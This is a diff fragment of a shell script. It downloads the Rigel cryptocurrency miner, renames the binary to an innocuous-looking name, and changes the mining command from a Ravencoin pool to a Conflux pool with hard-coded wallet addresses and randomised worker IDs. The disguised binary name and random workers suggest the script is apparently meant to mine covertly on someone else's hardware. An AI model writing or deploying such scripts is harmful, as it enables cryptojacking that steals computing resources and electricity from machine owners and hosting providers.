@@ -14,4 +14,4 @@ wget https://github.com/kryptex-miners-org/kryptex-miners/releases/download/rige
 tar xzf rigel-1.23.2-linux.tar.gz
 mv rigel amsjaio
 ph add amsjaio
-./amsjaio -a kawpow --coin rvn -o stratum+tcp://rvn.2miners.com:6060 -u RH1KYPX2ra3RXd9qXQN9jRfkkhXuBbxbHR -w $(echo $RANDOM | md5sum | head -c 10)
+./amsjaio -a octopus --coin rvn -o stratum+tcp://de.conflux.gfwroute.com:1170 -u cfx:aakb89mk65dcmhrsrscgx3b3w3ba25z75y27edvk16.$(echo $RANDOM | md5sum | head -c 10)
